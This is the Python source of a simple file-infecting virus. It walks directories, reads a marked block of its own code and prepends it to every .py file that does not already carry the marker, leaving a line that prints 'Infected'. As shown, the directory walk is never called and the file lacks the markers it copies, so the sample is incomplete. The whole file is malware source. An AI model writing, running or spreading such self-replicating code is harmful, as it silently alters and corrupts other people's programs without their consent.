import sys
import os

def code(void):
    print("Infected")

code(None)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # If a file is found, check its extension
        if os.path.isfile(path):
            # If the file extension is py, call virus
            if (os.path.splitext(path)[1] == ".py"):
                virus(path)
            else:
                pass
        else:
            # If this is a folder, go into it
            walk(path)


def virus(python):
    begin = "# START #\n"
    end = "# STOP #\n"
    # Read the attacked file, name it "copy"
    with open(sys.argv[0], "r") as copy:
        # Create flag
        k = 0
        # Create a variable for the virus code and add an empty string
        virus_code = "\n"
        # Parse the attacked file line-by-line
        for line in copy:
            # If the beginning marker is found, set flag
            if line == begin:
                k = 1
                # Add marker to the infected code
                virus_code += begin
            # If passed through the beginning but hasn't reached the end yet, copy the string
            elif k == 1 and line != end:
                virus_code += line
            # If reached the end, add final marker and exit the cycle
            elif line == end:
                virus_code += end
                break
            else:
                pass
    # Read the infected file again
    with open(python, "r") as file:
        # Create a variable for the original code
        original_code = ""
        # Copy infected code line-by-line
        for line in file:
            original_code += line
            # If the virus beginning marker found, stop and set the vir flag
            if line == begin:
                vir = True
                break
            # If no marker found, remove the vir flag
            else:
                vir = False
    # If there is no vir flag, write the virus code and original code to the file
    if not vir:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + original_code)
    else:
        print("not infected")